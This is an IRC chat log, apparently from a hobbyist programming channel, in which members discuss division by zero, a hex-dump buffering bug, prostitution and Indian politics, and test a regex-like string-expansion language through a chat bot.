Jul 07 12:02:03 <john_cephalopoda>	nortti: If she still believes it, replace the app with one that outputs Das Kapital for every input.
Jul 07 12:02:59 <nortti>	zgrep: how? x/0 = 0 || *0   0*x/0 = 0   0*0 = 0 (or: x*0/0 = 0   x*0 = 0   0 = 0)
Jul 07 12:03:01 <john_cephalopoda>	nortti: If x/0 is infinity, then infinity*0 is x.

Jul 07 12:03:33 <zgrep>	:p
Jul 07 12:03:51 <john_cephalopoda>	y*(x/y) is obviously x.
Jul 07 12:03:53 <nortti>	only if it works like division in general. I'm specifically asking for the case where they don't
Jul 07 12:04:03 <nortti>	john_cephalopoda: how is it obvious?
Jul 07 12:04:14 <john_cephalopoda>	nortti: Division by zero DOESN'T work like other divisions. That's the point.
Jul 07 12:04:35 <john_cephalopoda>	Kids today with calculators that lie to them >:(
Jul 07 12:05:13 <zgrep>	I mean, you can explain using limits that x/0 isn't 0, but rather infty. But that's just one way of looking at it / avoiding the problem of zero.
Jul 07 12:05:14 <john_cephalopoda>	My phone tells me "Can't divide by 0". That literal string.
Jul 07 12:05:35 <nortti>	zgrep: +inf or -inf?
Jul 07 12:05:39 <nortti>	(:P)
Jul 07 12:05:45 <john_cephalopoda>	zgrep: x/0 = infinity -> x = infinity*0
Jul 07 12:05:45 <zgrep>	Depends which side you approach from. :D
Jul 07 12:06:04 <zgrep>	I wonder what the calculator says for -5/0
Jul 07 12:06:26 <nortti>	hrm. maybe it is just easier to explain her rings
Jul 07 12:06:31 <FireFly>	haha
Jul 07 12:06:31 <john_cephalopoda>	Mine still insists that it "Can't divide by 0"
Jul 07 12:07:16 <john_cephalopoda>	nortti: Noooo! Explaining rings will only get her into osdev.
Jul 07 12:07:24 <john_cephalopoda>	Or marriage.
Jul 07 12:07:50 <john_cephalopoda>	Still, there's the chance of osdev. YOU WOULDN'T DO THAT TO A CHILD, WOULD YOU?!?
Jul 07 12:07:53 <zgrep>	:D:
Jul 07 12:08:41 <FireFly>	nortti: why would one define x/0 = 0? I mean, the reason for arguing in terms of the behaviour of division for other numbers is that it doesn't make much sense to assign a completely arbitrary value in a particular case--if we assign a meaning to divsiion by 0, we would want it to in some sense be consistent with division of other numbers, no?
Jul 07 12:09:20 <FireFly>	For division by a natural number, there's the "dividing into equal piles" approach. for division in general, you kind of really want it to be the inverse of multiplication
Jul 07 12:09:26 <nortti>	because that's one of the definitions of it she came up with, when it came up
Jul 07 12:09:30 <nortti>	right
Jul 07 12:09:48 <FireFly>	hmm
Jul 07 12:13:47 <zgrep>	nortti: How does x/0 = 0 fix the problem of 1=2 when dividing by zero?
Jul 07 12:15:13 <nortti>	a+b = c   a+b-c = 0 || +(a+b-c)   2(a+b-c) = 1(a+b-c)  || / (a+b-c)   2(a+b-c)/(a+b-c) = 1(a+b-c)/(a+b-c)   2*0 = 1*0   0 = 0
Jul 07 12:16:42 <zgrep>	Mmh...
Jul 07 12:17:42 <john_cephalopoda>	nortti: a=b=c=1.
Jul 07 12:17:58 <zgrep>	john_cephalopoda: a+b=c?
Jul 07 12:18:18 <john_cephalopoda>	Ah, damn, I knew that proof differently.
Jul 07 12:18:33 <john_cephalopoda>	But x/x = 1.
Jul 07 12:18:43 <nortti>	…
Jul 07 12:19:18 <nortti>	jesus christ, the whole point why I'm asking is because under that definition of division that doesn't hold for 0/0
Jul 07 12:19:24 <john_cephalopoda>	1*(a+b-c)*(1/a+b-c). It's just commutative.

Jul 07 12:20:05 <nortti>	john_cephalopoda: that law does not hold here. I want an example of an absurdity caused by that law not holding here
Jul 07 12:20:44 <nortti>	or other kind of absurdity caused by x/0 = 0, since probably other things that screws up
Jul 07 12:21:35 <nortti>	if we have x/0 = 0, we don't have a ring, so any argument based on ring laws is kind of moot

Jul 08 04:51:49 <bslsk05>	​thecutecuttlefish.org: image/png [293.082 kilobytes (1310x850)]
Jul 08 04:52:04 <sortie>	FireFly: fread will do buffering internally
Jul 08 04:52:25 <sortie>	Still, it's more efficient for you to read multiple bytes at once if you have the logic to process N bytes at once
Jul 08 04:52:33 <john_cephalopoda>	Cuttleman gets ready to work!
Jul 08 04:52:55 <sortie>	FireFly: If you're worried about efficiency, you may want to use read(2) avoid the stdio buffering
Jul 08 04:53:03 <sortie>	FireFly: Or you can use setvbuf to set the stdio buffer
Jul 08 04:54:00 <FireFly>	Right, it's more that there's this bug in hexd that zgrep reported, and it essentially stems from the interaction between reading BUFSIZ bytes at a time vs. printing n-column output, in that I'm not handling the BUFSIZ % n != 0 case properly
Jul 08 04:54:31 <FireFly>	and like.. I could handle that case, do a memmove and add some more variables to keep track of the amount of "excess from previous buffer" in start of buf and stuff
Jul 08 04:54:56 <FireFly>	but the code is already unnecessarily complicated vs. just reading byte at a time, so I'm pondering whether I should just simplify the code to make it easier to maintain instead
Jul 08 04:57:37 <FireFly>	or, well, I guess rather than read byte-at-a-time, I'd read one-row-at-a-time
Jul 08 04:57:48 <sortie>	Sure that can work
Jul 08 04:58:10 <zgrep>	Read one row at a time. That seems like a thing that makes sense.
Jul 08 04:58:17 <FireFly>	yeah, I think so too

Jul 08 14:31:17 <S_Gautam>	I mean you look at certain countries where people are interacting less and less (Japan, I'm mostly pulling it out of my ass partially and Wikipedia) and most people have sexual needs, sounds like it'd be a great market to invest in. Sounds unethical as fuck, I know
Jul 08 14:32:01 <heat>	more like investing in pornhub
Jul 08 14:32:06 <S_Gautam>	I mean literally getting $$$ by using other people's frustration. but still $ is $
Jul 08 14:32:26 <heat>	sexbots seem too non-human
Jul 08 14:32:36 <S_Gautam>	even CGI in the 80s seemed non-human
Jul 08 14:32:55 <heat>	but microsoft and apple didn't do cgi
Jul 08 14:33:09 <S_Gautam>	I mean they did implement stuff like Cortana and Siri
Jul 08 14:33:18 <S_Gautam>	Cortana sounds almost human 
Jul 08 14:33:27 <heat>	That's not cgi, and was in the 2010s
Jul 08 14:33:29 <S_Gautam>	I got scared while installing Windows 10 for the first time 
Jul 08 14:34:08 <heat>	They made useful products for people, where there wasn't a very good alternative
Jul 08 14:34:39 <heat>	While with sexbots, you have lots and lots of alternatives
Jul 08 14:35:02 <S_Gautam>	huge difference between porn and an actual sexbot
Jul 08 14:35:16 <S_Gautam>	let's assume the sexbot can do basic human interaction and conversation as well
Jul 08 14:35:31 <heat>	1) Sexbots are creepy asf
Jul 08 14:35:40 <heat>	2) Porn is, in a way, more human
Jul 08 14:35:49 <heat>	3) You have way more options
Jul 08 14:36:01 <S_Gautam>	okay, let's say instead of having sexbots ownership, we build sexbot brothels
Jul 08 14:36:22 <S_Gautam>	no human trafficking and bad shit and exploitation and money
Jul 08 14:36:23 <heat>	like social networks, dating apps, and real life
Jul 08 14:36:38 <heat>	That's worse
Jul 08 14:37:07 <heat>	No one's going to pay to have sex with an object
Jul 08 14:37:17 <heat>	independently of it's AI-ness
Jul 08 14:37:19 <S_Gautam>	heat: yes, that's the point. some people are beyond dysfunctional to participate in the dating world
Jul 08 14:37:35 <heat>	Right
Jul 08 14:37:50 <heat>	But the solution to that problem is to stop people from becoming dysfunctional
Jul 08 14:39:37 <S_Gautam>	h
Jul 08 14:39:39 <S_Gautam>	*hm
Jul 08 14:39:46 <S_Gautam>	are you then, against normal brothels as well?
Jul 08 14:40:00 <CompanionCube>	S_Gautam: it'd only be like Apple/MS if you can accuaretly predict which companies will make it big
Jul 08 14:40:09 <S_Gautam>	true
Jul 08 14:40:17 <CompanionCube>	and if you can do that you can make bigger profits
Jul 08 14:41:15 <heat>	S_Gautam: I'm meh
Jul 08 14:43:21 <heat>	I don't particularly mind because brothels aren't normally used to "run away" from the real world
Jul 08 14:43:43 <heat>	and human trafficking isn't a big problem in 1st world countries
Jul 08 15:09:59 <john_cephalopoda>	heat: Haha
Jul 08 15:11:13 <john_cephalopoda>	heat: People are lured from the Balkan states with "model jobs" and get stuck in prostitution.
Jul 08 15:11:35 <heat>	that's why I said 1st world
Jul 08 15:11:42 <heat>	balkan countries aren't very 1st world
Jul 08 15:11:58 <john_cephalopoda>	Umm, they are lured FROM there. TO Germany.
Jul 08 15:12:08 <john_cephalopoda>	Or other "first world" countries that still allow prostitution.
Jul 08 15:12:17 <heat>	hmm
Jul 08 15:12:29 <john_cephalopoda>	I recently saw a documentary on it (in German).
Jul 08 15:12:46 <heat>	that's why prostitution should be legalized and controlled
Jul 08 15:12:50 <john_cephalopoda>	Prostitution is quite some problem. A lot of people are working in there without really wanting it.
Jul 08 15:13:03 <heat>	that shit is bound to happen if things are not controlled
Jul 08 15:13:04 <john_cephalopoda>	heat: In Germany, prostitution is legalized and controlled.
Jul 08 15:13:19 <heat>	then something is wrong, because it's not being controlled
Jul 08 15:13:44 <john_cephalopoda>	It's hard to control.
Jul 08 15:13:54 <heat>	sure
Jul 08 15:14:13 <heat>	but recognizing it as a real job and trying to control it is the first step
Jul 08 15:14:14 <john_cephalopoda>	The "owners" got power over the prostitutes. 
Jul 08 15:14:26 <john_cephalopoda>	I don't think that this is a good step.
Jul 08 15:14:30 <john_cephalopoda>	I think the best thing to do is: Legalize people offering sex in exchange for money, but make taking the service illegal.
Jul 08 15:14:46 <heat>	why?
Jul 08 15:15:49 <john_cephalopoda>	That way, the prostitutes (who are the victims in many cases) are not illegalized. When they experience violence, threats, etc, they can defend themselves in court without having to fear prosecution.
Jul 08 15:17:06 <heat>	why illegalize taking the service?
Jul 08 15:17:38 <john_cephalopoda>	Because that way it doesn't sell well any more.
Jul 08 15:18:37 <john_cephalopoda>	And if it doesn't sell well, the whole scene will collapse and the ones behind it will lose their money.

Jul 08 15:21:16 <john_cephalopoda>	heat: Hmm, the service isn't really undesirable. But polls show that most prostitutes would like to quit if they could, so there seems to be some kind of force driving them into the job.
Jul 08 15:22:13 <heat>	That's why I'm saying it should be legalized and controlled
Jul 08 15:22:21 <john_cephalopoda>	heat: In addition to that, it is pretty hard to find proof that somebody is controlling the business. And the service is legal. Compare that with drug trading, where it's illegal and it's still hard to find the ones behind it.
Jul 08 15:22:37 <john_cephalopoda>	heat: But how do you control it? 
Jul 08 15:23:07 <heat>	if you keep it uncontrolled, the crime behind it will get more powerful 
Jul 08 15:23:09 <john_cephalopoda>	heat: How do you make sure the the prostitutes aren't forced by somebody to work?
Jul 08 15:23:09 <heat>	I'm not sure
Jul 08 15:23:41 <heat>	How do you make sure someone isn't forced by someone to work?
Jul 08 15:24:16 <heat>	You basically can't, and it's not your job
Jul 08 15:24:32 <heat>	if you create legal prostitution services, they can't be forced to work
Jul 08 15:24:48 <heat>	if you crack down on crime, there will be less of those cases

Jul 08 16:59:17 <shikhin>	What does that mean, "The SC is the Central Government"? The court isn't a part of the government, no.
Jul 08 16:59:38 <shikhin>	(Nor do I know of any people thinking that way.)
Jul 08 16:59:58 <S_Gautam>	heat: we actually need to be much more federal than the US eventually
Jul 08 17:00:14 <S_Gautam>	since a lot of states have their own languages even
Jul 08 17:02:19 <S_Gautam>	shikhin: I guess, yeah. I don't want to sound like a racist, but there's I've noticed that there's definitely a concern amongst a lot of people from the South that I've met, that the central government (including the central institutions) don't give them a fair share and that people from the North are immigrating to their cities and destroying their culture.
Jul 08 17:04:35 <S_Gautam>	ofc, Hindi imposition the central government tries to secretly do only magnifies the hysteria
Jul 08 17:05:31 <heat>	idk why but it sounds like india shouldn't be united
Jul 08 17:06:21 <S_Gautam>	would be worse if we broke apart
Jul 08 17:06:30 <heat>	why?
Jul 08 17:08:20 <S_Gautam>	Pakistan and Bangladesh broke off in '47, now we have a nuclear conflict. the society is highly collectivist, if there was a split, it'd probably involve quite a substantial amount of violence
Jul 08 17:09:38 <S_Gautam>	also inter-state immigration is becoming a thing, and there's been violence against people from different states who come to other states for work.
Jul 08 17:10:10 <heat>	you don't have a nuclear conflict
Jul 08 17:10:12 <heat>	just tension
Jul 08 17:12:02 <S_Gautam>	except the partition killed 1 million and displaced 15 million people
Jul 08 17:12:35 <S_Gautam>	besides I'm from another state living in another state, I don't want that shit to happen for personal reasons obviously

Jul 08 17:40:43 <shikhin>	Haven't seen a lot of people think the same about the supreme court. If they do, IMHO it's pretty misguided because the courts have a fairly diverse state-wise representation, and I don't see how they'd be favoring the north over the south.

Jul 08 17:45:01 <S_Gautam>	shikhin: I guess 'subtly' is a more appropriate word.
Jul 08 17:46:06 <S_Gautam>	That's the scariest part though, Pakistan tried Hindi imposition in East Bengal and it turned out a disaster for them, I'm hoping the Central administration knows what it's doing.
Jul 08 17:46:18 <shikhin>	They don't.
Jul 08 17:50:52 <S_Gautam>	shikhin: also afaik the parliamentary constituencies are mapped as per the 1971 census, since then the populations of UP/Bihar have exploded and the next remapping is to be done in 2026, which would lead to the Hindi states getting even a larger share 
Jul 08 17:50:58 <S_Gautam>	kinda fucked lol
Jul 08 17:51:17 <shikhin>	How so/
Jul 08 17:51:41 <S_Gautam>	as i understand it, wouldn't states with higher population get more seats within the parliament?
Jul 08 17:51:48 <shikhin>	Yes, as they should?
Jul 08 17:52:16 <S_Gautam>	That's also going to decrease the representation of Southern states within the parliament, no?
Jul 08 17:52:24 <shikhin>	Not sure why it's "kinda fucked"?
Jul 08 17:54:28 <S_Gautam>	I mean, that's why Hindi imposition is even a thing, right?
Jul 08 17:54:39 <shikhin>	Because of population? Not really.
Jul 08 17:56:04 <S_Gautam>	Why? I can understand in Pakistan it's mostly a symbol of a Islamic heritage (since it's Persianised) , in India it's mostly because large parts of the population speak it. No?
Jul 08 17:58:15 <shikhin>	In India it's Sanskritised and is utilized to sell a hindi / hindu / hindustan identity?
Jul 08 17:59:13 <S_Gautam>	Doubt it, the most Hindutvawaadi state in India (Maharashtra) hates Hindi imposition.
Jul 08 18:00:03 <shikhin>	Maharashtra's a special case. (Not sure how you decide which is the most "hindutvawaadi" state.)
Jul 08 18:01:19 <shikhin>	Anyway, not sure what there is to doubt… you could just as well find BJP members talking about this. They were the ones who coined "hindi, hindu, hindustan".
Jul 08 18:02:11 <shikhin>	Or maybe not coined, but definitely coopted.
Jul 08 18:02:33 <S_Gautam>	shikhin: I guess since the basis of Hindutva's historical revisionism lies in Maharashtra, since the Maratha Empire fought pretty well against the Mughal Empire. And that they've been ruled by SS, which is a far right Hindutva party since the beginning.
Jul 08 18:02:53 <shikhin>	…eh.
Jul 08 18:05:57 <S_Gautam>	Oh huh, they initially started as an anti-migrants from South India party and then expanded to Hindutva.
Jul 08 18:07:08 <shikhin>	Hindi for BJP is pretty similar to Marathi for the Shiv Sena?

Jul 09 02:52:07 <john_cephalopoda>	emily: Sex work with consent on both sides is not an issue to me either. But in many or most cases it isn't quite like that.
Jul 09 02:52:50 <emily>	right, agreed
Jul 09 02:52:55 <nortti>	yeah
Jul 09 02:53:03 <nortti>	also work on programs that allow ppl who want to get another job to do so
Jul 09 02:53:34 <emily>	just that I think most of the problems with sex work are about what it's like as work rather than the sex part specifically.
Jul 09 02:53:43 <john_cephalopoda>	I think exiting the scene is probably the hardest problem.
Jul 09 02:53:47 <emily>	perhaps sex can make it more likely to be exploitative or demeaning, but plain old labour can be exploitative and demeaning too
Jul 09 02:54:04 <nortti>	not to mention involve trafficing
Jul 09 02:54:09 <emily>	yeah
Jul 09 02:54:24 <emily>	but the labour problems in sex work are usually worsened or created by its black-market nature rather than helped by it
Jul 09 02:54:36 <olsner>	as I understand the swedish stuff it's supposed to eradicate prostitution, but tries to do it in a way that doesn't overtly penalize sex workers (who are defined as victims)
Jul 09 02:54:36 <emily>	see also war on drugs, yada yada
Jul 09 02:54:51 <john_cephalopoda>	You can go to the agency for work in Germany and they will help you find a job and pay you money while you are looking for one.
Jul 09 02:55:02 <john_cephalopoda>	You even get extra money when you send out applications.
Jul 09 02:55:11 <emily>	right -- if the Swedish Model was effective that would be one thing, but I both disagree with its goals and doubt its effectivity at targetting the problems as I see them
Jul 09 02:55:18 <olsner>	it smells a lot like the drug policy, where the important thing is cleaning up society of amoral or antisocial behavior
Jul 09 02:55:36 <emily>	john_cephalopoda: having interacted a ton with the UK benefits system I can say that although that is meant to be true in theory here, it's... not so rosy in practice
Jul 09 02:55:41 <emily>	perhaps germany is better, I wouldn't know
Jul 09 02:56:10 <nortti>	john_cephalopoda: are you able to do that, if you are homeless, suffer from problems with drugs, etc.?
Jul 09 02:57:11 <john_cephalopoda>	nortti: In theory you can.
Jul 09 02:57:59 <nortti>	I'm not asking in theory, I'm asking in practice
Jul 09 02:59:04 <john_cephalopoda>	Homelessness should theoretically not exist in Germany. But various factors like extremely high debts, drugs and other addictions and similar bring people into a situation that they can't control any more. Also some of them aren't allowed to stay in Germany but prefer to be homeless over going back to their home country. Others just feel ashamed for being poor and don't want to ask the state for help.
Jul 09 02:59:55 <nortti>	right. so the system leaves outside of it quite a few ppl
Jul 09 03:00:12 <john_cephalopoda>	Also children and youths who ran away from home are on the streets.
Jul 09 03:01:18 <john_cephalopoda>	There is help offered. But I guess many people in that situation are just completely overwhelmed and can't really leave that situation without help.
Jul 09 03:02:06 <emily>	are you sure there's help offered according to the specifications given, or just trust the state says it is? :/
Jul 09 03:02:22 <emily>	in practice these systems tend to be much, much worse in practice than on paper, even if you try to access them
Jul 09 03:04:23 <john_cephalopoda>	It works relatively well. I know people who are in that system and they are doing quite well.
Jul 09 03:04:41 <john_cephalopoda>	It could be better, of course.
Jul 09 03:05:01 <john_cephalopoda>	But helping homeless people doesn't win you an election.
Jul 09 03:05:55 <john_cephalopoda>	Making the social system better, fighting against the high flat prices in big cities, fighting against poverty of old people... Those things should be done.
Jul 09 03:06:52 <john_cephalopoda>	But nah, they got an election to win. So the topic every day is "Refugees!". Either for or against them. Win your election, increase the money your party gets, discuss about refugees, forget about poverty.
Jul 09 03:07:35 <emily>	I doubt anyone has won an election on supporting refugees, sadly.
Jul 09 03:07:48 <emily>	refugees and poverty are hardly unlinked subjects, though
Jul 09 03:09:32 <john_cephalopoda>	Hmm, not linked that much.
Jul 09 03:10:07 <john_cephalopoda>	Refugees are registered here and either get money and stay here or get money until they are sent back.
Jul 09 03:10:42 <john_cephalopoda>	They are managed relatively centralized, often living in special houses.
Jul 09 03:11:17 <nortti>	and those special houses are not in any way worse than general housing?
Jul 09 03:11:20 <john_cephalopoda>	Unemployment is as low as never before, it's very easy to find a job.
Jul 09 03:11:35 <john_cephalopoda>	nortti: It's basically housing on youth hostel level.
Jul 09 03:11:53 <olsner>	your belief in the system is admirable :P
Jul 09 03:12:00 <nortti>	yeah
Jul 09 03:12:06 <john_cephalopoda>	Old barracks are used, etc.
Jul 09 03:12:59 <nortti>	not discounting the possibility that everything is much better in germany. but I've been in a finnish version of one of those, and fuck me it was cramped there
Jul 09 03:14:02 <nortti>	(was acting as an ersatz finnish-as-second-language teacher, as they had (still) not gotten anyone with any education in finnish or teaching to do it)
Jul 09 03:14:37 <john_cephalopoda>	Big problem here, too. German teachers get really low wages, so there aren't many.
Jul 09 03:15:48 <john_cephalopoda>	Refugees have to wait for a long time until they get a course.
Jul 09 03:16:16 <john_cephalopoda>	Also it takes a long time until their request for asylum is through.
Jul 09 03:17:39 <john_cephalopoda>	There is a giant tax surplus. There were discussions if the tax payers should get some of it back or if it should be invested into stocks.
Jul 09 03:18:21 <john_cephalopoda>	Nobody thought of all the issues we have got. Of retired people who don't have enough money to live, although they paid into the retirement fund all their lives long.
Jul 09 03:18:28 <nortti>	does germany also have the system where it's illegal for someone whose asylum request is under processing to work?
Jul 09 03:18:48 <john_cephalopoda>	My guess is that it's just like that.
Jul 09 03:20:14 <john_cephalopoda>	So they get money or payment in kind.
Jul 09 03:20:24 <john_cephalopoda>	Food coupons or something, idk.
Jul 09 03:21:07 <john_cephalopoda>	Probably barely enough to live but nobody in charge cares.
Jul 09 04:16:24 <nortti>	announcement: in the near future I will move from ayu.smar.fi to yurie.smar.fi. ayu:7070 will move along, though I intend to set up some kind of "hey, go there" until ayu is decommissioned
Jul 09 04:17:31 <nortti>	hm. ??? → nano in 2012, nano → ayu in 2015, now ayu → yurie in 2018… I guess we'll be moving next in 2021

Jul 09 12:05:26 <S_Gautam>	all sex except PIV is 'unnatural'

Jul 09 12:06:15 <shikhin>	Hm.
Jul 09 12:06:34 <shikhin>	I think it was read to include oral sex only in 2013 by the supreme court.
Jul 09 12:07:02 <S_Gautam>	the least we can hope for is legalization of heterosexual 'unnatural' oral sex.
Jul 09 12:07:30 <S_Gautam>	like some countries which inherited the same constitution as British India have amended it but still criminalize gay sex
Jul 09 12:07:44 <heat>	can't yall just legalize everything except animals
Jul 09 12:07:47 <shikhin>	Erm, the law doesn't say anything about oral sex, that's the supreme court.
Jul 09 12:07:50 <heat>	would be a good idea

Like UFS, ext2 lacked journaling, but it also eschewed some other safety checks that UFS had in order to run faster. Because of this, saying "fsck" over and over again was sometimes necessary."

Jul 11 01:34:17 <nortti>	right, but is it a superset of sed or sth
Jul 11 01:34:27 <zgrep>	It's... closer to a subset, with some extras.
Jul 11 01:34:35 <zgrep>	For example, it doesn't have . at the moment.
Jul 11 01:34:38 <zgrep>	Nor does it have * or +.
Jul 11 01:34:56 <shikhin>	The idea was to allow regex in the replacements, and then somehow index both the matching regex and the replacement regex such that if index i of the matching regex matches, you replace with index i of the replacement regex.
Jul 11 01:34:57 <zgrep>	Nor did I give it \x01 or escape stuff like that, yet.
Jul 11 01:35:00 <nortti>	ah
Jul 11 01:35:23 <zgrep>	& in the replacement regex is the entire matching regex.
Jul 11 01:35:37 <nortti>	and ~ is some kind of "rotate"?
Jul 11 01:35:44 <zgrep>	Yup.
Jul 11 01:36:00 <nortti>	also, what's the ^ between [a-z] and [A-Z]?
Jul 11 01:36:04 <shikhin>	~N - shift by N. ~ – reverse list of possibilities.

Jul 11 01:36:12 <shikhin>	That's interspersing the two possibilities.

Jul 11 01:36:17 <happybot>	​zgrep: ['a', 'A', 'b', 'B', 'c', 'C', 'd', 'D']

Jul 11 01:39:13 <zgrep>	Rather, the issue is that the parser generator is doing weird things with the grammar I gave it.
Jul 11 01:39:24 <shikhin>	I refuse to believe the problem is in the tool without further evidence.
Jul 11 01:39:53 <shikhin>	Hm, does it parse that as being ambiguous?

Jul 11 01:40:02 <shikhin>	Oh no.
Jul 11 01:40:07 <zgrep>	Oh, wait, lemme check.
Jul 11 01:40:25 <zgrep>	Yes.

Jul 11 01:40:42 <shikhin>	Link to the grammar + the ways in which it parses it?
Jul 11 01:40:42 <zgrep>	Err.

Jul 11 01:40:46 <bslsk05>	​ahti.space: text/plain; charset=utf-8 [567 bytes]
Jul 11 01:40:50 <zgrep>	The ways in which it parses, I don't have! :P
Jul 11 01:41:00 <shikhin>	B-but…
Jul 11 01:41:02 <zgrep>	Oh, all the possibilities... one sec.
Jul 11 01:41:21 <nortti>	what parser generator are yo using?
Jul 11 01:41:25 <nortti>	*you
Jul 11 01:42:35 <zgrep>	Lark
Jul 11 01:42:48 <zgrep>	shikhin: Same file.
Jul 11 01:42:56 <shikhin>	Uuh.
Jul 11 01:42:56 <zgrep>	It's not pretty, because I can't get it to pretty-print yet.
Jul 11 01:43:01 <shikhin>	Very readable.
Jul 11 01:43:11 <zgrep>	Because apparently "drv" doesn't have pretty printing functionality in it. ._.
Jul 11 01:43:19 <zgrep>	Or something like that.
Jul 11 01:44:44 <shikhin>	Err, I'm confused, why do you expect that grammar to not be ambiguous?
Jul 11 01:45:19 <S_Gautam>	why do some people have this weird patch of light skin near their eyes
Jul 11 01:45:20 <nortti>	iirc LALR(1
Jul 11 01:45:37 <nortti>	+) had sth where you can't have (certain types of?) ambiguity for it to work
Jul 11 01:45:39 <zgrep>	shikhin: Well, it's perfectly clear to me what I want. :P
Jul 11 01:45:47 <zgrep>	It's also a different kind of parser too, I think.
Jul 11 01:45:58 <nortti>	ah, okay
Jul 11 01:45:59 <zgrep>	Has two(?) options?
Jul 11 01:46:08 <zgrep>	shikhin: How would you make it unambiguous.
Jul 11 01:46:25 <shikhin>	I don't know.
Jul 11 01:46:31 <zgrep>	That's the same problem I have. :(
Jul 11 01:46:42 <nortti>	I'd have reverse be some extra thing then
Jul 11 01:46:44 <nortti>	say, ~~
Jul 11 01:46:59 <shikhin>	Or just a different character, maybe.
Jul 11 01:47:05 <zgrep>	B-but why? Surely that's not why it's ambiguous.
Jul 11 01:47:21 <shikhin>	Uh?
Jul 11 01:47:23 <shikhin>	I-it is?
Jul 11 01:47:44 <zgrep>	Well, then it would happily read ~2 as two literal characters and concatenate them, for example.
Jul 11 01:47:47 <zgrep>	s/would/could/
Jul 11 01:47:47 <bslsk05>	​<zgrep*> Well, then it could happily read ~2 as two literal characters and concatenate them, for example.
Jul 11 01:47:51 <shikhin>	I'm pretty sure you could rewrite things so it's not ambiguous this way too, but I can't think of just how nright now.
Jul 11 01:47:59 <nortti>	^
Jul 11 01:48:15 <shikhin>	zgrep: ~ needs to be escaped if it's a literal character?
Jul 11 01:48:26 <zgrep>	Mmh, fair point.
Jul 11 01:48:57 <zgrep>	This still feels like putting a hack atop it...
Jul 11 01:49:08 <shikhin>	xv/[abcd]\320/ Oh, there's this too, nortti. Indexes into the possibilities.
Jul 11 01:49:09 <happybot>	​shikhin: ['d', 'c', 'a']
Jul 11 01:49:30 <nortti>	hm
Jul 11 01:49:30 <zgrep>	If it's a number after ~, it should be part of ~, otherwise, it's reverse and the rest of the characters are concatenate. I just don't know how to tell it that.
Jul 11 01:49:57 <zgrep>	(And, well, \d+ after ~, technically speaking.)
Jul 11 01:50:07 <zgrep>	(Err, with a possible negative.)
Jul 11 01:50:11 <olsner>	hm, IIRC LALR resolves (some) ambiguity by choosing the leftmost parse (or whatever the LR stands for), maybe unless there are shift/reduce conflicts
Jul 11 01:50:30 <nortti>	zgrep: can you add some kind of assert that after a reverse that there can't be a \d there?
Jul 11 01:50:33 <nortti>	oh
Jul 11 01:50:44 <zgrep>	I just hacked on "no literal numbers" as a thing.
Jul 11 01:50:57 <zgrep>	(Except in [], but that's unique enough.)
Jul 11 01:50:59 <nortti>	shikhin: zgrep: when / where did you come up with this?
Jul 11 01:51:09 <zgrep>	Over the past few days, I think.
Jul 11 01:51:17 <shikhin>	zgrep came up with it, I just made arbitrary decisions when zgrep couldn't.
Jul 11 01:51:20 <nortti>	ah
Jul 11 01:51:30 <zgrep>	I think shikhin had the idea for rolls and such, maybe?
Jul 11 01:51:32 <shikhin>	Over the private chats.
Jul 11 01:53:05 <nortti>	I find it interesting how on surface it's pretty regexy, but order mattering makes it a pretty different in the kinds of transforms you can and need to do on it
Jul 11 01:53:24 <shikhin>	There's also the question of how to deal with *.
Jul 11 01:54:03 <zgrep>	We have a few ideas.
Jul 11 01:54:08 <shikhin>	(And the question of how to make this efficient, but I suppose I'm jumping the gun and right now there's the question of how to make it fast.)
Jul 11 01:54:14 <shikhin>	s/fast/correct/ Grr, I'm sleepy.
Jul 11 01:54:14 <bslsk05>	​<shikhin*> (And the question of how to make this efficient, but I suppose I'm jumping the gun and right now there's the question of how to make it correct.)
Jul 11 01:54:21 <nortti>	would be interesting to hear the ideas
Jul 11 01:56:17 <shikhin>	Hm.
Jul 11 01:56:29 <zgrep>	Err, one possible answer is to do it the same way I plan on maybe doing . which is it simply is part of concatenation. Replacements simply wouldn't support *.
Jul 11 01:56:38 *	shikhin finds it tough to explain and looks at zgrep instead.
Jul 11 01:56:41 <zgrep>	(And it would store matches it finds for use in &.)
Jul 11 01:57:10 <shikhin>	That is probably the most sane option, now that I think of it.
Jul 11 01:57:47 <nortti>	hm, so .* would be "one thing"?
Jul 11 01:57:52 <zgrep>	Yeah.
Jul 11 01:57:59 <nortti>	makes sense
Jul 11 01:58:52 <shikhin>	The other option is to count the number of repetitions it takes for all the *s for the match, and use that to build a complicated index.
Jul 11 01:59:50 <shikhin>	Er––I suppose this amounts to what zgrep said when there's no * in the replacement.
Jul 11 02:00:07 <shikhin>	(Or it could if you deal with & appropriately.)
Jul 11 02:02:54 <zgrep>	Another answer is that it's a special "infinite match". ^ would combine the infinities as it normally does. | would... we don't know. Concatenation would happen in a special order (the cartesian product of two countable infinities is itself a countable infinity, so this works).
Jul 11 02:03:50 <nortti>	hm, that feels harder to reason about
Jul 11 02:03:53 <zgrep>	A third possibility, is some sort of even more special handling for infinities.
Jul 11 02:04:06 <zgrep>	And that was left about as specified as the sentence I just said.
Jul 11 02:04:23 <shikhin>	I don't remember what that entailed, but I liked zgrep's idea for |.
Jul 11 02:04:31 <nortti>	is (foo|bar)baz supported (yet?), and (how) does it get flattened?
Jul 11 02:04:31 <shikhin>	Which I'll let zgrep explain.
Jul 11 02:04:42 <shikhin>	xv/(foo|bar)baz/
Jul 11 02:04:43 <happybot>	​shikhin: ['foobaz', 'barbaz']
Jul 11 02:04:52 <nortti>	makes sense
Jul 11 02:05:09 <nortti>	xv/(foo|bar)^(baz|qux)/
Jul 11 02:05:09 <happybot>	​nortti: ['foo', 'baz', 'bar', 'qux']
Jul 11 02:05:20 <nortti>	mh
Jul 11 02:06:18 <shikhin>	xv/(foo|bar)^(baz|qux)/&~ this is a feature too, fwiw/
Jul 11 02:06:18 <happybot>	​shikhin: ['foo', 'baz', 'bar', 'qux'] -> ['qux this is a feature too, fwiw', 'bar this is a feature too, fwiw', 'baz this is a feature too, fwiw', 'foo this is a feature too, fwiw']
Jul 11 02:06:23 <shikhin>	Right.
Jul 11 02:06:33 <puckipedia>	xv///
Jul 11 02:06:34 <happybot>	​puckipedia: Parsing error.
Jul 11 02:06:46 *	shikhin looks at zgrep.
Jul 11 02:07:16 <nortti>	xv/(foo|bar)/[abc]/
Jul 11 02:07:41 <shikhin>	D-did puckipedia break it?
Jul 11 02:07:46 <puckipedia>	.. :D
Jul 11 02:07:54 <shikhin>	That took just about one minute, I'm very impressed.
Jul 11 02:07:59 <puckipedia>	I DID
Jul 11 02:08:07 <puckipedia>	... oh god
Jul 11 02:08:11 <puckipedia>	did I make it infinitely loop
